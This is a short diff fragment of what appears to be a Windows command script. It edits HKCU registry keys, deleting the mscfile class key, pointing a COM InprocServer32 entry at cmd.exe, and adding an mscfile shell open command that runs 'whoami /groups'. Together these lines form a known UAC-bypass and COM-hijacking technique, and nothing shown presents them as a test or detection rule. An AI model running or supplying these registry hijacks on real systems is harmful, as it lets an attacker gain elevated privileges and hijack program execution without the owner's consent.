@@ -32,3 +32,5 @@ cliconfg.exe
 REG DELETE "HKCU\Software\Classes\mscfile" /f
 REG ADD "HKCU\Software\Classes\CLSID\{944F4834-1524-4D8E-B7B5-6F1B6C2B2E4A}\InprocServer32" /d "C:\Windows\System32\cmd.exe" /f
 
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /k whoami /groups" /f
+
